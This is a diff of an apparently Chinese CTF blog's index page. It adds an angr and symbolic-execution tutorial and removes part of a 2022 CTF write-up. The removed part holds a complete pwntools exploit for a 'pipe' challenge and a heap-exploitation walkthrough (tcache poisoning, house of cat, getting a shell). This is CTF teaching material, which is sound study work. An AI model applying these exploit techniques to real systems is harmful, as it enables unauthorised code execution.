@@ -156,6 +156,175 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">angr的使用与符号执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-12-09 18:27:15 / Modified: 18:30:33" itemprop="dateCreated datePublished" datetime="2022-12-09T18:27:15+08:00">2022-12-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>Angr 介绍</strong></p>
+<p>angr 是一个二进制代码分析工具（基于 python），能够自动化完成二进制文件的分析，并找出漏洞</p>
+<ul>
+<li>它将以前多种分析技术集成进来，­­­能够进行动态的符号执行分析（类似于 KLEE 和 Mayhem），也能够进行多种静态分析</li>
+<li>PS：使用符号执行分析一个程序时，该程序会使用符号值作为输入（并非使用具体值），在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值</li>
+</ul>
+<p><strong>传统符号执行</strong></p>
+<p>传统符号执行是一种静态分析技术</p>
+<ul>
+<li>通过使用抽象的符号（静态或者全局变量的名称）代替具体值来模拟程序的执行</li>
+<li>当遇到分支语句时，它会探索每一个分支，将分支条件加入到相应的路径约束中</li>
+<li>若约束可解，则说明该路径是可达的</li>
+</ul>
+<p>接下来就通过以下的伪代码案例来推演这个过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">twice</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testme</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    z = twice(y);</span><br><span class="line">    <span class="keyword">if</span>(z == x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y+<span class="number">10</span>)&#123;</span><br><span class="line">            ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    x = sym_input();</span><br><span class="line">    y = sym_input();</span><br><span class="line">    testme(x,y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>程序不会直接输入具体值，而是输入一个符号值</li>
+<li>接着尽可能探索每一个分支，把程序的所有执行路径表示成一棵执行树</li>
+</ul>
+<img src="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/1670505794268.png" class width="1670505794268"> 
+<p>符号执行维护了：</p>
+<ul>
+<li>符号状态 σ (symbolic state)：变量到符号表达式的映射 </li>
+<li>符号路径约束 PC (path constraint)：表示当前路径的约束条件</li>
+</ul>
+<p>在对程序的某一路径分支进行符号执行的终点，把 PC 输入约束求解器 (constraint solver) 以获得求解，生成实际的输入值</p>
+<ul>
+<li>PS：如果程序把生成的具体值作为输入执行，它将会和符号执行运行在同一路径，即此时 PC 的公式所表示的路径，并且以同一种方式结束</li>
+</ul>
+<p>经典的符号执行有一个关键的缺点，若符合执行路径的符号路径约束无法使用约束求解器进行有效的求解，则无法生成输入</p>
+<p><strong>动态符号执行</strong></p>
+<p>混合“实际执行”和“符号执行” (concolic execution)，是真正意义上的动态符号执行 </p>
+<ul>
+<li>经典的符号执行，过度的依赖了符号执行的约束求解能力，限制了传统符号执行的能力发挥</li>
+<li>如果能加入具体值进行分析，将大大简化分析过程，降低分析的难度和提升效率</li>
+<li>但分析过程中，仍不可避免的还是需要将各种条件表达式，进行符号化抽象后变成约束条件参与执行</li>
+</ul>
+<p>将程序语句转换为符号约束的精度，对符号执行所达到的覆盖率以及约束求解的可伸缩性会产生重大影响，所以如何做好 “混合具体(Concrete)执行” 和 “符号(Symbolic)执行” 的能力的平衡，就成为现代符号执行的关键点</p>
+<p><strong>选择性符号执行</strong></p>
+<p>受路径爆炸和约束求解问题的制约，符号执行不适用于程序规模较大或逻辑复杂的情况，并且对于与外部执行环境交互较多的程序尚无很好的解决方法</p>
+<p>选择性符号执行有助于解决这类问题，也是具体执行和符号执行混合的一种分析技术，依据特定的分析，决定符号执行和具体执行的切换使用</p>
+<ul>
+<li>用户可以指定一个完整系统中的任意部分进行符号执行分析（可以是应用程序、库文件、系统内核和设备驱动程序等）</li>
+<li>选择性符号执行在符号执行和具体执行间转换，并透明地转换符号状态和具体状态</li>
+<li>选择性符号执行极大地提高了符号执行在实际应用中对大型软件分析测试的可用性，且不再需要对这些环境进行模拟建模</li>
+</ul>
+<p>选择性符号执行在指定区域内的符号化搜索，就是完全的符号执行，在该区域之外均使用具体执行完成，选择性符号执行的主要任务就是在分析前将大程序区分为 “具体执行区域” 和 “符号执行区域”</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lqerio/p/15980670.html">符号执行（symbolic executio）技术综述</a> </p>
+<p><strong>Angr 安装</strong></p>
+<p>为了不与 pwntools 库引起冲突，可以采用拉取 docker 镜像的方式进行使用（当然也可以直接 <code>pip install angr</code> 也可以）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull angr/angr</span><br></pre></td></tr></table></figure>
+<p>以下脚本可以方便我们运行 docker angr：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/zsh</span></span><br><span class="line">pwd=`pwd`</span><br><span class="line">script=$1</span><br><span class="line">docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr &quot;/home/angr/.virtualenvs/angr/bin/python&quot; &quot;/mnt/$script&quot; $2 $3</span><br></pre></td></tr></table></figure>
+<p>使用该脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./angr script.py</span><br></pre></td></tr></table></figure>
+<p><strong>Angr 使用</strong></p>
+<p>Github 上有一个针对 angr 的练习集：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">jakespringer/angr_ctf (github.com)</a> </li>
+</ul>
+<p>这里先通过 <code>00_angr_find</code> 来了解 angr 的基础用法</p>
+<p>IDA 分析出来的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中的 <code>complex_function</code> 是一个加密的过程</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">complex_function</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">3</span> * a2 + a1 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果采用常规的解题思维，那就要对 <code>complex_function</code> 进行逆向，分析出输入值，但 angr 采用了不同的做法</p>
+<p>先新建一个 angr 工程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(<span class="string">&quot;./00_angr_find&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>告诉 angr 一个初始化状态：（Unicorn 框架允许执行任意一段二进制代码）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_state = p.factory.entry_state() <span class="comment"># 程序入口点</span></span><br></pre></td></tr></table></figure>
+<p>生成一个 SimulationManagers 对象，用于管理“模拟执行”：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure>
+<p>告诉 SimulationManagers 对象需要查找的路径地址，并开始“模拟执行”：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sm.explore(find=<span class="number">0x08048678</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>angr 会把输入值 <code>s1</code> 转化为一个符号向量（用于决定“模拟执行”的路径）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后遍历所有的程序路径，找到进入各个路径的约束条件：</li>
+</ul>
+<img src="/2022/12/09/angr%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/1670578268195.png" class width="1670578268195"> 
+<ul>
+<li>最后把目标路径的约束输入约束求解器 (constraint solver) 以获得求解，生成实际的输入值</li>
+</ul>
+<p>最终的结果存放在 <code>found</code> 中，我们可以打印出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>Enter the password: &#x27;</span><br><span class="line">b<span class="number">&#x27;</span>JXWVXRKX<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/08/Strtok%20off-by-null+%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2342,141 +2511,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/" class="post-title-link" itemprop="url">深信服杯CTF2022</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-11-15 18:31:48 / Modified: 18:33:12" itemprop="dateCreated datePublished" datetime="2022-11-15T18:31:48+08:00">2022-11-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>8.9k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>8 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pipe: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=d5d6c196bf2c85c2c624a610ec541382acc30bb0, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，全开</li>
-</ul>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">  close(fd);</span><br><span class="line">  system(<span class="string">&quot;./ctf.sh&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>往 <code>&quot;./ctf.sh&quot;</code> 中写 <code>cat flag</code> 就可以了</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>可以先把 <code>cat flag</code> 写入管道，然后把 <code>pipe_buffer</code> 中的数据写入 <code>&quot;./ctf.sh&quot;</code></p>
-<p>完整 exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pipe&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;45715&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x16D7)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;cmd&gt;&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_pipe</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_pipe</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;read size&gt;\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input&gt;&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_file</span>(<span class="params">path</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">path,size</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**File path&gt;&quot;</span>,path)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;**size?&gt;&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;file path&gt;&quot;</span>,<span class="string">&quot;./ctf.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cat flag\n&quot;</span></span><br><span class="line">write_to_pipe(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">write()</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="manageheap"><a href="#manageheap" class="headerlink" title="manageheap"></a>manageheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.\n</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">manageheap: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.35</span><span class="number">-0u</span>buntu3_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b988b53575c5a8324331c1b492940f6098e71ace, stripped<span class="number">&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，全开</li>
-</ul>
-<p><strong>漏洞分析</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num = LODWORD(chunk_list[index]-&gt;num);</span><br><span class="line"><span class="keyword">if</span> ( i &gt; num )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], id) )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;chunk_list[index]-&gt;chunk_data[<span class="number">8</span> * i], <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;change done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当 <code>i==num</code> 时，有8字节的溢出</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>先利用8字节的溢出来修改 chunk-&gt;size，释放后获得 unsorted chunk，接下来执行一次申请操作，泄露出遗留在 chunk 中的 main_arena 和 tcache-&gt;next</p>
-<p>然后打 tcache attack，把 <code>IO_list_all</code> 写入 tcachebin 中，这里有两个注意点：</p>
-<ul>
-<li>libc-2.34 及其以上版本会设置 key 值，利用如下公式就可以绕过：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">target = IO_list_all^key</span><br></pre></td></tr></table></figure>
-<ul>
-<li>劫持目标 tcachebin 之前，需要先看看 tcache head-&gt;count 的值够不够申请到 <code>IO_list_all</code>（当对应 count 为“0”时，程序将不会申请该 tcachebin 上的 free chunk），比赛时就考虑漏了这个问题，导致 <code>IO_list_all</code> 申请不出来，浪费了很长的时间</li>
-</ul>
-<p>在高版本 libc 中，最终劫持控制流的手段就那么几种，比赛时我使用了 house of cat</p>
-<p>接下来就是标准的 house of cat 了，IO 流可以如下代码进行触发：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !read(<span class="number">0</span>, chunk_list[i]-&gt;chunk_data, <span class="number">8</span> * LODWORD(chunk_list[i]-&gt;num)) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当输入的 <code>chunk_list[i]-&gt;num</code> 为“0”时，<code>read</code> 就会执行失败</li>
-<li>然后调用 <code>exit</code> 触发 house of cat</li>
-</ul>
-<p>由于本题目没有沙盒，我的第一反应是直接写 <code>one_gadget</code>，后来打远程时环境不对，只能用 <code>system(&quot;/bin/sh&quot;)</code></p>
-<p>当时不知道怎么控制程序的参数，幸好 house of cat 触发后直接执行了 <code>system(&quot;aaaaaaaa&quot;)</code>，于是我把所有的 <code>&quot;aaaaaaaa&quot;</code> 替换为 <code>&quot;/bin/sh&quot;</code> 然后就 getshell 了</p>
-<p>完整 exp：</p>
